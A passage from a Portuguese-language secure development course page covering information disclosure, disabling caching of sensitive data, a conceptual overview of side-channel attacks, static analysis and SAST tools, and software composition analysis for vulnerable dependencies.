futuros.</li> <li>Se um usuário tentar criar uma conta usando um endereço de e-mail, não informe se já existe uma conta com esse endereço. Da mesma forma, se um usuário tentar redefinir sua senha usando um endereço de e-mail, não informe se não houver uma conta com esse endereço. Fornecer essas informações permitiria que um invasor determinasse se um endereço de e-mail específico está sendo usado (ou não) por alguma conta existente.</li> <li>Em geral, não exiba dados confidenciais/privados, a menos que seja necessário naquele momento.</li> </ul> <p>Implemente o registro de auditoria no início do desenvolvimento. Assim, se precisar registrar informações mais detalhadas para auxiliar na depuração, registre essas informações nos registros em vez de exibi-las ao usuário. Os registros de auditoria são realmente convenientes para depuração (porque são projetados para registrar informações úteis sem interferir nas operações normais), e é mais provável que você inclua informações úteis de status nos registros se eles forem desenvolvidos em paralelo com o restante do programa. Eles também reduzirão a tentação de revelar informações demais a usuários não confiáveis.</p> <p>Além disso, garanta que os usuários não recebam informações não autorizadas. Permissões e namespaces devem ser claramente definidos para evitar isso.</p> <h2 id=evite-armazenar-em-cache-informacoes-confidenciais>Evite armazenar em cache informações confidenciais<a class=headerlink href=#evite-armazenar-em-cache-informacoes-confidenciais title="Permanent link">¶</a></h2> <p>O cache (criação de cópias intermediárias de dados) pode acelerar muitas respostas.</p> <p>No entanto, <strong>se você estiver servindo dados muito sensíveis, evite armazená-los em cache sempre que possível</strong>.</p> <p>Por exemplo, se estiver implementando um site, você deve servir <em>apenas</em> os dados sensíveis de algumas páginas web especializadas e desabilitar <em>completamente</em> o cache desses dados no servidor, no cliente e em quaisquer proxies ao longo do caminho.</p> <p>Desabilitar caches evita vazamentos acidentais de um cache e é mais uma maneira de implementar privilégios mínimos.</p> <p>O cache pode ocorrer em qualquer parte de um sistema, mas o cache desnecessário de dados sensíveis é especialmente comum como parte da saída, por isso nos concentramos em desabilitar o cache como parte da saída segura.</p> <p><strong>No servidor, os sistemas comumente usados ​​para cache incluem memcached e Redis</strong>.</p> <p>A maneira mais segura de garantir que o cache do navegador e do proxy web esteja desabilitado é por meio deste conjunto de cabeçalhos HTTP ( <a href=https://stackoverflow.com/questions/49547/how-do-we-control-web-page-caching-across-all-browsers>"Como controlamos o cache de páginas da web em todos os navegadores?"</a> ):</p> <div class=highlight><pre><span></span><code>Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
</code></pre></div> <p>Algumas dessas configurações são relevantes apenas para navegadores extremamente antigos. Se você se importa apenas com navegadores atuais, este cabeçalho HTTP é suficiente para desabilitar o cache:</p> <p><strong>Cache-Control: no-store, must-revalidate</strong></p> <p><strong>Isso é especialmente problemático porque muitos sites ignoraram os padrões da web por muito tempo</strong>.</p> <p>O padrão HTTP/1.1, publicado em 1999, padronizou o cabeçalho para desabilitar a gravação de conteúdo no armazenamento ("no-store").</p> <p>No entanto, muitos sites continuaram a usar apenas os mecanismos não padronizados suportados pelo navegador Internet Explorer.</p> <p>Em 2017, descobriu-se que 70% dos sites testados (sites financeiros, de saúde, de seguros e de serviços públicos) falharam em impedir corretamente que os navegadores armazenassem conteúdo em cache, porque usavam incorretamente apenas a solicitação não padronizada para armazenar dados em cache [ <a href=https://www.ise.io/casestudies/industry-wide-misunderstandings-of-https/#5d>"Industry-wide Misunderstandings of HTTPS" por Independent Security Evaluators (ISE), 12 de julho de 2017</a> ].</p> <p>Você deve sempre tentar usar uma interface padrão para solicitar um recurso relacionado à segurança sempre que possível, para aumentar a probabilidade de o mecanismo funcionar no futuro.</p> <p>Você também pode considerar implementar verificações extras para garantir que quaisquer dados armazenados em cache sejam enviados somente para alguém autorizado a recebê-los.</p> <h2 id=ataques-de-canal-lateral>Ataques de canal lateral<a class=headerlink href=#ataques-de-canal-lateral title="Permanent link">¶</a></h2> <p>Em alguns casos, o software que você desenvolve pode enviar uma saída relevante para a segurança que você não pretendia enviar.</p> <p>Um <em>ataque de canal lateral</em> é um ataque em que um invasor obtém informações não autorizadas explorando a implementação do software (em vez de uma fraqueza em um algoritmo ou um defeito).</p> <p>Existem muitos tipos diferentes de ataques de canal lateral; <strong>aqui estão alguns exemplos</strong>:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Ataque de temporização: um ataque baseado na medição do tempo gasto em diferentes cálculos. É até possível realizar alguns ataques de temporização em uma rede, já que as estatísticas modernas conseguem neutralizar uma quantidade significativa de jitter.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Ataque de cache: um ataque baseado no monitoramento de acessos ao cache, normalmente em um ambiente físico compartilhado (como um serviço de nuvem).</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Ataque de monitoramento de energia: um ataque baseado na observação do consumo variável de energia elétrica.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Remanência de dados: um ataque baseado na leitura de dados depois que eles foram considerados excluídos.</li> </ul> <p>Sistemas criptográficos são frequentemente alvos desses ataques, portanto, bibliotecas que implementam criptografia devem ser especialmente implementadas para tentar combater tais ataques.</p> <p>Se você precisar combater esses tipos de ataques, além do que é necessário para criptografia, os ataques de canal lateral podem ser difíceis de impedir.</p> <p>Se for extremamente importante combater ataques de canal lateral, geralmente é melhor pagar para eliminar o compartilhamento de recursos e o acesso que permitem os canais laterais.</p> <p>Por exemplo, se ataques de cache forem uma preocupação séria, você pode optar por usar hardware de propósito único ou pagar um provedor de nuvem para reduzir o compartilhamento (por exemplo, para usar uma arquitetura de locatário único). Ataques de monitoramento de energia podem ser combatidos dificultando a medição do consumo de energia por um invasor.</p> <p>Felizmente, além de ataques a sistemas criptográficos, os ataques de canal lateral são menos comuns hoje em dia. A maioria dos desenvolvedores precisa se concentrar nas outras questões discutidas neste curso e, somente então, em circunstâncias mais específicas, precisa se preocupar com ataques de canal lateral. Os invasores normalmente não se preocupam em tentar implementar um ataque de canal lateral se o software estiver repleto de vulnerabilidades mais fáceis de encontrar, como XSS e estouros de buffer.</p> <h2 id=analise-estatica-e-dinamica>Análise Estática e Dinamica<a class=headerlink href=#analise-estatica-e-dinamica title="Permanent link">¶</a></h2> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Análise estática</td> <td><strong>Qualquer abordagem para verificar software (incluindo encontrar defeitos) sem executá-lo</strong>. Isso inclui ferramentas que examinam o código-fonte em busca de vulnerabilidades (por exemplo, ferramentas de varredura de vulnerabilidades de código-fonte). Também inclui humanos lendo o código e procurando por problemas.</td> </tr> <tr> <td>Análise dinâmica</td> <td><strong>Qualquer abordagem para verificar software (incluindo a descoberta de defeitos) executando software em entradas específicas e verificando os resultados</strong>. Testes tradicionais são um tipo de análise dinâmica. Testes fuzz, em que você envia várias entradas <em>aleatórias</em> a um programa para verificar se ele faz algo que não deveria, também são um exemplo de análise dinâmica.</td> </tr> <tr> <td>Algumas pessoas também têm uma categoria chamada <em>análise híbrida</em> para abordagens que combinam ambas, enquanto outras incluem abordagens híbridas na categoria de análise dinâmica.</td> <td></td> </tr> </tbody> </table> <h2 id=relatorios-verdadeiros-e-falsos>Relatórios verdadeiros e falsos<a class=headerlink href=#relatorios-verdadeiros-e-falsos title="Permanent link">¶</a></h2> <p>Há uma longa história de uso de vários tipos de detectores para detectar situações importantes, muitas das quais não têm nada a ver com software. Detectores de fumaça, por exemplo, tentam detectar fumaça de incêndios perigosos. Infelizmente, detectores nunca são perfeitos.</p> <p>Em segurança, frequentemente queremos usar ferramentas que encontrem e relatem certos tipos de vulnerabilidades. Idealmente, uma ferramenta de detecção de vulnerabilidades como essa sempre relataria exatamente as vulnerabilidades que você deseja que ela relate, e nada mais. Novamente, tais ideais raramente se aplicam na realidade. Portanto, uma ferramenta pode relatar algo ou não, e esse relatório ou não relatório pode estar correto ou incorreto, levando a quatro possibilidades.</p> <table> <thead> <tr> <th>Relatório de Análise/Ferramenta</th> <th>Relatório correto</th> <th>Relatar incorreto</th> </tr> </thead> <tbody> <tr> <td><strong>Relatado (um defeito)</strong></td> <td><strong>Verdadeiro positivo (VP):</strong> Relatado corretamente (um defeito)</td> <td><strong>Falso positivo (FP):</strong> Relatório incorreto (de um "defeito" que não é um defeito) <br>("erro Tipo I")</td> </tr> <tr> <td><strong>Não reportou (um defeito ali)</strong></td> <td><strong>Verdadeiro Negativo (TN):</strong> Não relatou corretamente (um determinado defeito)</td> <td><strong>Falso negativo (FN):</strong> Incorreto porque não relatou (um defeito) <br>("erro Tipo II")</td> </tr> <tr> <td>A realidade é que geralmente há um trade-off entre falsos positivos e falsos negativos.</td> <td></td> <td></td> </tr> </tbody> </table> <p>Ferramentas podem ser projetadas ou configuradas para gerar menos falsos positivos (relatórios incorretos), mas essa falta de sensibilidade normalmente significa que elas frequentemente gerarão mais falsos negativos (elas não relatarão coisas que você esperaria que relatassem).</p> <p>Para mais detalhes, consulte o <em><a href=https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf>Relatório SATE V: Dez Anos de Exposições de Ferramentas de Análise Estática</a></em> (2018).</p> <h2 id=aplicando-ferramentas>Aplicando ferramentas<a class=headerlink href=#aplicando-ferramentas title="Permanent link">¶</a></h2> <p>Se você estiver adicionando uma ferramenta a um projeto existente, talvez queira configurá-las para limitar bastante o que elas relatam e focar apenas nas vulnerabilidades com as quais você mais se preocupa.</p> <p>Isso lhe dará tempo para aprender a <em>ajustar</em> a ferramenta e entender seus resultados. Então, uma vez que esses resultados sejam resolvidos, aumente a sensibilidade das suas ferramentas ou adicione mais ferramentas para detectar mais problemas. Não adianta tentar detectar mais problemas do que você pode lidar.</p> <p>Se você estiver adicionando ferramentas a um projeto recém-iniciado, geralmente é melhor configurá-las para serem muito sensíveis. Em um novo projeto, você não ficará sobrecarregado com os relatórios e receberá feedback imediato sobre os problemas que suas ferramentas conseguem detectar.</p> <p>Onde você adiciona essas ferramentas? Em resumo, adicione-as ao máximo, pelo menos, ao seu pipeline de integração contínua (CI). Dessa forma, mudanças incrementais serão analisadas repetidamente e problemas de segurança serão reportados com antecedência.</p> <p>Algumas ferramentas são OSS, enquanto outras são proprietárias. Algumas das ferramentas proprietárias são caras, mas, se você as usa para desenvolver OSS, muitas ferramentas e/ou serviços são gratuitos ou estão disponíveis com descontos substanciais.</p> <p>Então, vamos dar uma olhada em alguns tipos de ferramentas que você pode usar para ajudar a tornar seu software seguro.</p> <h2 id=visao-geral-da-analise-estatica>Visão geral da análise estática<a class=headerlink href=#visao-geral-da-analise-estatica title="Permanent link">¶</a></h2> <p>Análise estática é qualquer abordagem para verificar software (incluindo a descoberta de defeitos) sem executá-lo. Isso inclui humanos que revisam código. Também inclui ferramentas que revisam código-fonte, código de bytes e/ou código de máquina.</p> <h2 id=revisao-humana>Revisão Humana<a class=headerlink href=#revisao-humana title="Permanent link">¶</a></h2> <p>Humanos podem ser incríveis em encontrar defeitos.</p> <p>Esta é uma das grandes vantagens potenciais do software de código aberto (OSS); como qualquer pessoa pode revisar o código-fonte do OSS para encontrar defeitos, existe o potencial de uma revisão em massa por pares.</p> <p>Mas humanos têm suas desvantagens. O tempo humano é caro, humanos ficam entediados e têm dias "ruins" em que são menos eficazes (por exemplo, podem deixar passar coisas).</p> <p>Humanos diferentes também têm níveis diferentes de eficácia. É ótimo ter humanos revisando código, mas você também quer oferecer suporte a humanos com ferramentas que encontrem problemas que eles podem não perceber.</p> <p>Se você puder fazer com que humanos revisem o código, faça-o! Mas você pode querer instruí-los a examinar problemas nos quais as ferramentas não são particularmente boas.</p> <p>Em particular, é bom que as pessoas revisem os "pontos de entrada" (superfície de ataque) além de uma fronteira de confiança para garantir que cada solicitação seja autorizada ou rejeitada.</p> <p>Determinar se uma solicitação é autorizada ou não não é algo em que a maioria das ferramentas seja boa (elas não têm as informações para tomar a decisão). Além disso, se essa análise for muito difícil para humanos, há algo errado com o software – deveria ser relativamente fácil responder a essa pergunta em cada ponto de entrada.</p> <p>Em geral, se houver problemas que as ferramentas não conseguem identificar, talvez seja melhor modificar o design para que o problema não aconteça.</p> <p>Por exemplo, escolha uma linguagem segura para a memória ou projete um componente do sistema de forma que apenas requisições seguras possam ser feitas.</p> <p>Se isso não funcionar, pode ser sensato tentar encontrar ou desenvolver uma ferramenta para encontrá-lo. Dito isso, sempre haverá problemas para os quais as ferramentas não funcionarão bem.</p> <p>Se nada mais funcionar, trabalhe para concentrar a ferramenta mais poderosa de todas no problema: as pessoas. Mas o tempo das pessoas é limitado, então, sempre que possível, tente não depender <em>apenas</em> da revisão humana.</p> <h2 id=ferramentas-genericas-de-deteccao-de-bugs-ferramentas-de-qualidade-avisos-do-compilador-e-ferramentas-de-verificacao-de-tipo>Ferramentas genéricas de detecção de bugs: ferramentas de qualidade, avisos do compilador e ferramentas de verificação de tipo<a class=headerlink href=#ferramentas-genericas-de-deteccao-de-bugs-ferramentas-de-qualidade-avisos-do-compilador-e-ferramentas-de-verificacao-de-tipo title="Permanent link">¶</a></h2> <p>Algumas ferramentas examinam código-fonte, código de bytes ou código de máquina em busca de problemas genéricos de "qualidade".</p> <p>Por exemplo, podem procurar indentações enganosas, combinações de construções que geralmente indicam um defeito ou métodos excessivamente longos que podem ser difíceis de entender posteriormente.</p> <p>Há uma grande variedade deles, incluindo sinalizadores de alerta do compilador, verificadores de estilo e assim por diante.</p> <p>As ferramentas em si costumam ser baratas ou gratuitas e costumam ser executadas rapidamente, pois normalmente não exigem uma análise profunda.</p> <p>Essas ferramentas geralmente não se concentram na segurança, mas usá-las ainda pode ajudar a melhorar a segurança:</p> <ul> <li>Alguns defeitos que eles encontram são vulnerabilidades de segurança.</li> <li>Há relatos de que código <em>limpo</em> é mais fácil de ser entendido por outras ferramentas e humanos... então corrigir os problemas relatados pode tornar outras abordagens mais eficazes.</li> </ul> <p>Se você estiver iniciando um novo projeto, é importante ativar o máximo possível dessas ferramentas (incluindo os avisos do compilador) o mais rápido possível.</p> <p>Se você ativá-las cedo, verá alguns relatórios recomendando uma abordagem diferente e, em vez disso, simplesmente a usará.</p> <p>Se você tentar adicioná-las a um projeto <em>existente</em> , frequentemente verá muitos problemas para corrigir, mesmo que a probabilidade de qualquer um deles ser um problema sério seja pequena.</p> <p>Portanto, se você já tiver um projeto, normalmente precisará adicionar essas ferramentas lentamente, configurando-as para relatar apenas um subconjunto (como apenas relatórios acionados por uma alteração) e, em seguida, expandindo lentamente o que elas relatam.</p> <p>Comentários semelhantes se aplicam à verificação de tipos estática.</p> <p>Algumas linguagens de programação possuem verificações integradas para tipos declarados estaticamente. Existem prós e contras em tipos declarados estaticamente.</p> <p>Determinar e especificar tipos leva tempo, então fazer isso pode atrasar o desenvolvimento inicial, o que é negativo para programas pequenos e descartáveis.</p> <p>No entanto, essas declarações estáticas podem ajudar a encontrar automaticamente certos tipos de defeitos, bem como auxiliar ferramentas de suporte e otimização.</p> <p>Se você estiver usando uma linguagem de programação com verificação de tipos estática, trabalhe com o sistema de tipos para usá-lo e ajudar a encontrar defeitos precocemente.</p> <p>Dito isso, embora essas ferramentas sejam geralmente fáceis de usar, elas geralmente não se concentram em questões de segurança... e, portanto, muitas vezes ignoram problemas de segurança.</p> <p>Vamos falar sobre ferramentas que usam análise estática especificamente para encontrar vulnerabilidades de segurança.</p> <h2 id=scanners-de-codigo-de-segurancaferramentas-de-teste-de-seguranca-de-aplicativos-estaticos-sast>Scanners de código de segurança/Ferramentas de teste de segurança de aplicativos estáticos (SAST)<a class=headerlink href=#scanners-de-codigo-de-segurancaferramentas-de-teste-de-seguranca-de-aplicativos-estaticos-sast title="Permanent link">¶</a></h2> <p>Algumas ferramentas analisam código especificamente em busca de vulnerabilidades.</p> <p>Elas são conhecidas por diversos nomes, como ferramentas de <strong>Teste de Segurança de Aplicativos Estáticos (SAST)</strong>, scanners de código de segurança, scanners de código-fonte de segurança (se examinam código-fonte), scanners de código binário (se examinam apenas executáveis) ou simplesmente <em>analisadores de código estático</em> .</p> <p>Algumas pessoas usam o termo SAST apenas quando a ferramenta analisa código-fonte (para mais detalhes, consulte " <em><a href=https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/ >The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP",</a></em> de Fred Bals, 2018, e " <em><a href=https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html>10 Types of Application Security Testing Tools: When and How to Use Them",</a></em> de Thomas Scanlon, 2018), mas não limitaremos o termo dessa forma.</p> <p>A ideia por trás dessas ferramentas é que muitas vulnerabilidades têm padrões específicos.</p> <p>Uma ferramenta projetada para procurar esses padrões pode relatar tipos semelhantes de vulnerabilidades.</p> <p>Os <strong>padrões são geralmente heurísticos</strong>, e diferentes ferramentas geralmente procuram padrões diferentes. Portanto, uma ferramenta pode encontrar <em>algumas</em> vulnerabilidades, mas <strong>não cometa o erro de pensar que qualquer uma dessas ferramentas encontra <em>todas as</em> vulnerabilidades</strong>. Além disso, cada ferramenta procurará apenas padrões relevantes para um conjunto específico de linguagens/ambientes.</p> <p>Isso significa que essas ferramentas são adequadas apenas para as linguagens/ambientes para os quais foram projetadas e, além disso, uma ferramenta pode ser melhor em uma linguagem do que em outra.</p> <p>Mesmo considerando múltiplas ferramentas projetadas para oferecer suporte a uma determinada linguagem, diferentes ferramentas frequentemente encontrarão vulnerabilidades que outras não percebem.</p> <p>Se o seu objetivo <strong>principal é encontrar o maior número possível de vulnerabilidades, é melhor usar várias ferramentas</strong>, até mesmo várias ferramentas do mesmo tipo, para que uma vulnerabilidade não detectada por uma ferramenta possa ser detectada por outra.</p> <p>Infelizmente, usar várias ferramentas pode ser custoso em termos de dinheiro e esforço. Algumas ferramentas são caras e, independentemente de qual seja, leva tempo para configurá-las para seu uso específico e analisar seus relatórios.</p> <p>Como frequentemente acontece, há uma compensação: o conjunto de ferramentas que você selecionar será fortemente influenciado pelos recursos disponíveis, bem como pela probabilidade e impacto esperados de vulnerabilidades não encontradas.</p> <p>É claro que nem tudo o que é relatado por qualquer uma dessas ferramentas é uma vulnerabilidade <em>real</em> .</p> <p>Todas elas apresentam algum risco de gerar um falso positivo. Por exemplo, uma ferramenta pode detectar uma vulnerabilidade acionada por alguma entrada, mas você pode saber que apenas um usuário confiável pode controlar essa entrada... portanto, embora a ferramenta esteja correta em certo sentido, não se trata de uma vulnerabilidade propriamente dita.</p> <p>Em muitos casos, é melhor corrigir o relatório de qualquer maneira; as pessoas costumam estar erradas quando dizem que algo <em>"não pode"</em> acontecer, e o software ou seu ambiente podem mudar no futuro (portanto, corrigi-lo tornará o software à prova do futuro).</p> <p>Se você tiver certeza de que o relatório é um falso positivo e "consertar" o código para eliminá-lo não valer a pena, a maioria dessas ferramentas tem uma maneira de desabilitar o relatório (por exemplo, por meio de um comentário no código-fonte). Dessa forma, a ferramenta deixará de reportá-lo; caso contrário, os relatórios da ferramenta, com o tempo, apresentarão apenas um grande conjunto de falsos positivos. Certifique-se de desabilitar um relatório apenas se tiver <em>certeza de</em> que é um falso positivo.</p> <h2 id=scanners-de-codigo-de-seguranca-especializadosferramentas-sast>Scanners de código de segurança especializados/ferramentas SAST<a class=headerlink href=#scanners-de-codigo-de-seguranca-especializadosferramentas-sast title="Permanent link">¶</a></h2> <p>Algumas ferramentas são projetadas para procurar apenas um ou alguns tipos específicos de vulnerabilidades.</p> <p>Elas ainda são scanners de código de segurança, também conhecidos como ferramentas SAST, mas, como são especialmente desenvolvidas para realizar essa análise específica, às vezes podem ser melhores nessa análise do que uma ferramenta de uso mais geral, projetada para encontrar muitos tipos diferentes de vulnerabilidades.</p> <p>Além disso, algumas ferramentas de uso mais geral nem procuram esses problemas específicos.</p> <p>Aqui estão alguns tipos de vulnerabilidades que ferramentas SAST especializadas podem detectar:</p> <ul> <li>Vulnerabilidades de Negação de Serviço de Expressões Regulares (ReDoS) (ou seja, expressões regulares com desempenho péssimo no pior caso). Você pode procurar por termos como <em>ReDoS</em> , <em>evil regex</em> e <em>safe regex</em> . Eles extraem as expressões regulares do código-fonte e, em seguida, as analisam.</li> <li>Credenciais codificadas, como chaves criptográficas e senhas. Ferramentas que buscam credenciais codificadas são às vezes chamadas de "scanners secretos".</li> </ul> <h2 id=outras-ferramentas-de-analise-estatica>Outras ferramentas de análise estática<a class=headerlink href=#outras-ferramentas-de-analise-estatica title="Permanent link">¶</a></h2> <p>Existem muitos outros tipos de ferramentas de análise estática.</p> <p>Um tipo é tão importante que dedicaremos uma seção inteira a ele.</p> <p>O tipo de análise que essas ferramentas realizam tem vários nomes, incluindo análise de composição de software (SCA), análise de dependência e análise de origem. Não importa como seja chamada, ela é importante, então discutiremos isso a seguir.</p> <h1 id=analise-de-composicao-de-software-scaanalise-de-dependencia>Análise de Composição de Software (SCA)/Análise de Dependência<a class=headerlink href=#analise-de-composicao-de-software-scaanalise-de-dependencia title="Permanent link">¶</a></h1> <p>Um tipo de ferramenta de análise estática é tão importante que queremos discuti-la separadamente. O tipo de análise que essas ferramentas realizam tem vários nomes, incluindo análise de composição de software (SCA), análise de dependência e análise de origem. Não importa como seja chamada, ela é importante. Vamos primeiro analisar <em>por que</em> ela é importante.</p> <h2 id=necessidade-de-sca>Necessidade de SCA<a class=headerlink href=#necessidade-de-sca title="Permanent link">¶</a></h2> <p>Antigamente, os desenvolvedores de software escreviam a maior parte do software em seus aplicativos. Hoje, isso quase nunca acontece. Em vez disso, os desenvolvedores de software normalmente reutilizam pacotes de software que são, em sua maioria, escritos por terceiros e, então, escrevem apenas a funcionalidade especializada e o código de integração necessários para que tudo funcione da maneira desejada. Isso também se aplica a pacotes de software reutilizáveis; esses pacotes normalmente dependem de pacotes, que dependem de outros, e assim por diante. O mesmo se aplica a sistemas operacionais independentes, imagens de máquinas virtuais e imagens de contêineres – eles geralmente incluem muito software escrito por terceiros.</p> <p>Há vantagens claras em reutilizar software. Uma delas é que economiza muito tempo (e dinheiro) – você não precisa desenvolver aquele código! Outra vantagem é que um pacote reutilizado costuma ser especialmente bom para essa tarefa (já que alguém dedicou tempo especificamente para resolver aquele problema); esses pacotes costumam lidar com casos extremos que, de outra forma, você poderia esquecer.</p> <p>Mas quando você reutiliza software, há uma desvantagem: esse software terá vulnerabilidades. Você deve tentar escolher um software que provavelmente tenha menos vulnerabilidades. Mas, em geral, as vulnerabilidades <em>serão</em> encontradas no software que você usa, direta e indiretamente; essas vulnerabilidades serão anunciadas publicamente e atualizações para os componentes que as corrigem serão lançadas. Como a maioria dos softwares reutilizados é software livre (OSS), algumas pessoas e empresas chamam isso de "exame para OSS". Isso não está totalmente correto, porque na verdade é um problema para qualquer software reutilizado, mas é compreensível que as pessoas se concentrem no OSS, pois a maioria dos softwares reutilizados é software livre (OSS).</p> <p><strong>Observação:</strong> O uso de componentes conhecidos como vulneráveis ​​é um problema tão comum que, em 2013, a OWASP adicionou o tópico " <em>Usando Componentes com Vulnerabilidades Conhecidas"</em> ao Top 10 da OWASP. O uso de componentes com vulnerabilidades conhecidas está na 9ª posição do Top 10 da OWASP de 2017. O uso de componentes vulneráveis ​​e desatualizados está na 6ª posição do Top 10 da OWASP de 2021.</p> <p>É inevitável que você precise atualizar rapidamente componentes reutilizados vulneráveis, então você precisa se <em>preparar</em> para detectar e fazer atualizações de segurança rapidamente para o software reutilizado em seus aplicativos.</p> <h2 id=preparando-se-para-o-inevitavel-vulnerabilidades-em-suas-dependencias>Preparando-se para o inevitável: vulnerabilidades em suas dependências<a class=headerlink href=#preparando-se-para-o-inevitavel-vulnerabilidades-em-suas-dependencias title="Permanent link">¶</a></h2> <p>Uma parte fundamental da sua preparação é usar uma ferramenta que possa determinar qual software você reutiliza e relatar quaisquer vulnerabilidades publicamente conhecidas nesses componentes reutilizados.</p> <p>Ferramentas que podem identificar componentes reutilizados têm vários nomes, incluindo ferramentas de análise de composição de software (SCA), ferramentas de análise de componentes de software, ferramentas de análise de dependências ou ferramentas de análise de origem.</p> <p>Historicamente, muitas dessas ferramentas foram desenvolvidas para revisão legal, para garantir que todo o software reutilizado esteja sendo usado em conformidade com suas licenças, que as licenças (como usadas) sejam compatíveis e que haja licenças para todos eles.</p> <p>É uma ótima ideia incluir esse tipo de análise de licença sempre que você tentar incluir ou atualizar qualquer software reutilizado. Mas, para nossos propósitos, vamos nos concentrar nas ferramentas que comparam essa lista de componentes (incluindo seus números de versão) com bancos de dados de vulnerabilidades conhecidas.</p> <p>Existem bancos de dados públicos de softwares com vulnerabilidades publicamente conhecidas; um banco de dados especialmente utilizado é o Banco de Dados Nacional de Vulnerabilidades (NVD) dos EUA.</p> <p>O NVD é um banco de dados público de vulnerabilidades publicamente conhecidas, todas identificadas por um identificador CVE (cada vulnerabilidade tem um identificador CVE diferente) combinado com uma lista de produtos e números de versão que são conhecidos por apresentarem essa vulnerabilidade. Alguns fornecedores comerciais também possuem seus próprios bancos de dados.</p> <p>Portanto, tudo o que uma ferramenta SCA precisa fazer, em teoria, é descobrir quais componentes (e suas versões) estão presentes, procurar cada um em um ou mais bancos de dados e relatar as correspondências.</p> <p>Mesmo detectar os componentes nem sempre é fácil; às vezes, componentes reutilizados não são óbvios (por exemplo, porque foram copiados e colados, em vez de serem manipulados adequadamente usando um gerenciador de pacotes).</p> <p>Ainda mais fundamentalmente, no entanto, os bancos de dados são constantemente atualizados à medida que novas vulnerabilidades são encontradas. Isso significa que software reutilizado que não tinha vulnerabilidades conhecidas anteriormente pode agora <em>ter</em> uma vulnerabilidade conhecida.</p> <p>Mesmo que a vulnerabilidade fosse de conhecimento público anteriormente, esse fato pode não ter sido registrado em versões anteriores do(s) banco(s) de dados usado(s) pela ferramenta. Portanto, essas ferramentas devem ser executadas novamente periodicamente, ou as comparações devem ser executadas novamente, para que você fique ciente das vulnerabilidades recém-descobertas.</p> <p>Você deve evitar alguns comportamentos inadequados para tornar essas ferramentas mais úteis.</p> <p>Alguns desenvolvedores copiam código reutilizado de outros pacotes para seus aplicativos, em vez de usar um gerenciador de pacotes para automatizar a identificação e a atualização de pacotes reutilizados.</p> <p>Pior ainda, os desenvolvedores às vezes <em>modificam</em> e/ou fazem o check-in dessas cópias (criando um fork). Algumas ferramentas de SCA podem, na verdade, examinar o código linha por linha, identificar essas cópias prováveis ​​e conectá-las de volta às suas fontes (para ajudar a identificar vulnerabilidades).</p> <p>Mas essas ferramentas de SCA são mais complexas, geralmente caras para comprar e usar, e tentar <em>atualizar</em> esse software costuma ser bastante difícil, pois tudo é feito manualmente.</p> <p>Além disso, essas ferramentas de SCA precisam necessariamente usar heurísticas para detectar tais situações, que podem deixar esses componentes de lado de qualquer maneira.</p> <p>É muito melhor aplicar algumas boas práticas.</p> <p>Primeiro, ao reutilizar software, use um gerenciador de pacotes para gerenciá-lo, um que registre os números de versão específicos em um formato padrão que você possa registrar em seu sistema de controle de versão.</p> <p>Ao usar um formato padrão, você pode usar ferramentas de SCA muito mais simples, e os dados serão mais precisos. Usando um gerenciador de pacotes, você pode facilmente executar uma atualização de software e verificar se o novo conjunto de componentes funciona.</p> <p>Mas quem decide a rapidez com que você precisa atualizar seus componentes reutilizados? Essa é uma pergunta complicada. Algumas pessoas podem dizer: "a política da minha empresa", "meu diretor de segurança da informação" (CISO), "meu diretor de informações" (CIO) ou algo assim. Todas essas respostas estão erradas.</p> <p>Se o seu objetivo é ter um sistema seguro, a resposta correta é que os <em><strong>invasores</strong> decidem quando você precisa atualizar</em> ! Isso porque você precisa implantar a versão atualizada antes que um invasor explore essa vulnerabilidade no seu sistema implantado.</p> <p>A velocidade é importante quando um componente do qual você depende tem uma vulnerabilidade publicamente conhecida, e você <em>sabe</em> que isso acontecerá às vezes. Portanto, tentar lidar com isso completamente manualmente é um erro. Em vez disso, você deve garantir que:</p> <ol> <li>Você tem pelo menos uma ferramenta SCA que informa automaticamente quando há uma vulnerabilidade conhecida em um componente que seu sistema usa.</li> <li>Você pode facilmente atualizar um componente usando um comando simples, geralmente dizendo a um gerenciador de pacotes para alternar para uma versão diferente daquele componente e verificando essa alteração.</li> <li>Você pode testar automaticamente a configuração modificada para garantir que a atualização do componente não interrompa nada importante.</li> <li>Você pode implantá-lo rapidamente (se implantar diretamente) e/ou distribuí-lo (se distribuir o software para outros).</li> </ol> <p>Se seus testes automatizados não forem bons o suficiente para tornar aceitável a implantação de componentes atualizados, você terá um sério problema de segurança.</p> <p>A necessidade de atualizar componentes reutilizados é inevitável – e não apenas uma possibilidade – na maioria dos softwares. Se os componentes que você usa estiverem tão desatualizados que você não consiga atualizar para uma versão suportada, isso também é um problema sério... porque, novamente, a necessidade de atualizar um componente devido a uma vulnerabilidade geralmente é inevitável.</p> <p>Como todas as ferramentas, as SCAs são propensas a falsos positivos.</p> <p>Em particular, um componente pode ter uma vulnerabilidade, mas apenas quando certos métodos são usados ​​ou apenas em certas configurações. Se você não usar o componente de uma forma que a vulnerabilidade possa ser explorada, então, é claro, você não precisa atualizá-lo. Mas isso é um pouco enganoso.</p> <p>Muitas vezes é difícil ter <em>certeza</em> de que você não precisa fazer a atualização. Além disso, se você tem um processo adequado onde você pode facilmente atualizar componentes ― e você precisa ― então, muitas vezes leva mais tempo para determinar (com certeza) que a vulnerabilidade não é explorável do que simplesmente fazer a atualização.</p> <p>Além disso, o tempo gasto para descobrir isso pode dar a um invasor tempo para explorá-la se for uma vulnerabilidade real. Portanto, muitas vezes é melhor apenas atualizar, mesmo que não haja certeza de que seja explorável.</p> <p>Existem muitas SCAs disponíveis. Se você usa o GitHub ou o GitLab, eles fornecem gratuitamente alguns relatórios básicos de SCA sobre vulnerabilidades conhecidas em muitos componentes (supondo que você use um formato padrão de gerenciamento de pacotes que eles possam processar).</p> <p>Projetos da Linux Foundation podem usar o LFx (antigo CommunityBridge), que oferece esse serviço. Há uma variedade de fornecedores que 